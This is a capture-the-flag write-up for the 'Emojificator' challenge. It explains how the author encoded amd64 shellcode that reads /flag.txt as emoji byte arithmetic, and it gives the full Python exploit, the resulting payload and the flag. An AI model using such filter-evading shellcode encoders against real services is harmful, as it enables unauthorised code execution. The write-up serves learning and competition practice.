# The Emojificator

## Challenge

> Emojis are actually very cool. Emojis have byte representations under the hood, and you can look at it in Python with "⚠️".encode('utf-8')!
>
> But for the emoji mathificator, we've added more fun. If you want to get some bytes out of an emoji, just tell us which byte you want using the clock emojis! If "⚠️".encode('utf-8') is b'\xe2\x9a\xa0\xef\xb8\x8f', then ⚠️🕐 (one o'clock) will give you the first byte, \xe2!
>
> But here's where it gets crazy. Say you want to add two bytes together before they get processed? No problemo my friend! Just use the ➕ emoji! So ⚠️🕐➕⚠️🕐 gives the byte \xc4 (\xe2 + \xe2 % 256 is \xc4). Since we're really bananas, you can even subtract them. With the emoji mathificator, there's nothing you can't do.
>
> You can even run code! Start your emojis with 🏃 and we'll run the bytes that result. Truly nothing is as powerful as the mathificator!

We are allowed to write shellcode in the form of emojis, using clocks to specify which byte to use.
We also get basic arithmetic with addition and subtraction.
We are not allowed to chain these operations.

Thus, every byte in our shellcode must be a single emoji+clock or two of them joined by addition or subtraction.

## Solution

I copied a subset of emojis from the internet and iterated over them, extracting all the possible bytes from a single emoji+clock pair.

Then, I iterated over each possible pair of emojis and added all the bytes that could be made from any two pairs with the given operations.

Once this was complete, I could translate any byte to a set of emojis.

I used pwntools to generate shellcode which would read the flag, then I translated it into emojis.
The final payload looked like this:

```
🏃😀🕐➖😆🕓😀🕐➕😄🕓😀🕐➖🤨🕓🥸🕓😀🕑➕🤐🕓😀🕐➖😊🕓😀🕐➖😄🕓😀🕐➖😏🕓😀🕐➖😉🕓😀🕑➕😏🕓😀🕐➕😄🕓😀🕐➕😈🕓😀🕐➖🤠🕓😀🕐➖😆🕓😀🕑➖😝🕓😀🕐➖😀🕒😀🕐➖🤨🕓😉🕓😆🕓➖😀🕑😀🕐➖👿🕓😀🕑➖🤩🕓😀🕑➖🤐🕓🤣🕒➖😀🕑😀🕐➖🤯🕓🥺🕓😀🕑➖🤠🕓😀🕑➖🤠🕓😀🕑➖🤠🕓😀🕐➕😏🕓😀🕐➖🤨🕓😉🕓😶🕓➖😀🕐😀🕐➖😆🕓😀🕑➕😉🕓😀🕐➖😀🕒😀🕐➖😆🕓🤠🕓➖😀🕑😀🕐➖🤑🕓🙂🕒😀🕑➖🤐🕓🤣🕒➖😀🕑
```

## Exploit

```py
#!/usr/bin/env python3

emojis = [
        '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂',
        '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩',
        '😘', '😗', '😚', '😙', '🥲', '😋', '😛', '😜',
        '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐',
        '🤨', '😐️', '😑', '😶', '😏', '😒', '🙄', '😬',
        '🤥', '😌', '😔', '😪', '😮', '💨', '🤤', '😴',
        '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶',
        '😶', '🥴', '😵', '💫', '😵', '🤯', '🤠', '🥳',
        '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '😮',
        '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰',
        '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓',
        '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈',
        '👿', '💀', '💩', '🤡', '👹', '👺', '👻', '👽️',
        '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽',
        '🙀', '😿', '😾', '🙈', '🙉', '🙊', '👋', '🤚',
        '🤟', '🤘', '🤙', '👈️', '👉️', '👆️', '🖕', '👇️',
        '👍️', '👎️', '✊', '👊', '🤛', '🤜', '👏', '🙌',
        '👐', '🤲', '🤝', '🙏', '🤳', '💪', '🦾', '🦿',
        '🦵', '🦶', '👂️', '🦻', '👃', '🧠', '🫀', '🫁',
        '🦷', '🦴', '👀', '👄', '💋', '👶', '🧒', '👦',
        '👧', '🧑', '👨', '👩', '🧔', '🧔', '👤', '👥',
        '🫂', '👣', '👕', '👖', '👔', '👗', '👙', '👘',
        '👠', '👡', '👢', '👞', '👟', '👒', '🎩', '🎓',
        '👑', '🎒', '👝', '👛', '👜', '💼', '👓', '🤿',
        '🌂', '🧣', '🧤', '🧥', '🦺', '🥻', '🩱', '🩲',
        ]

clocks = ['🕐', '🕑', '🕒', '🕓']
plus = '➕'
minus = '➖'
run = '🏃'

bytemap = {}

for emoji in emojis:
    encoded = emoji.encode('utf-8')
    for byte in encoded[0:4]:
        if byte not in bytemap:
            bytemap[byte] = emoji + clocks[encoded.index(byte)]

bytemap_append = {}

for i in range(0, len(bytemap)):
    for j in range(i, len(bytemap)):
        op_i = list(bytemap)[i]
        op_j = list(bytemap)[j]

        add = (op_i + op_j) % 0x100
        if add not in bytemap and add not in bytemap_append:
            bytemap_append[add] = bytemap[op_i] + plus + bytemap[op_j]

        sub1 = (op_i - op_j) % 0x100
        if sub1 not in bytemap and sub1 not in bytemap_append:
            bytemap_append[sub1] = bytemap[op_i] + minus + bytemap[op_j]

        sub2 = (op_j - op_i) % 0x100
        if sub2 not in bytemap and sub2 not in bytemap_append:
            bytemap_append[sub2] = bytemap[op_j] + minus + bytemap[op_i]

bytemap = bytemap | bytemap_append

print(f"loaded {len(bytemap)} / 256 bytes")

from pwn import *

context.update(arch="amd64", os="linux", bits = 64, endianness = 'little')

shellcode = asm(shellcraft.cat(b'/flag.txt'))

payload = run

for byte in shellcode:
    payload += bytemap[byte]

print(payload)
```

## Flag

```
flag{21cce4d0231549544b1c9786b982e8e7}
```
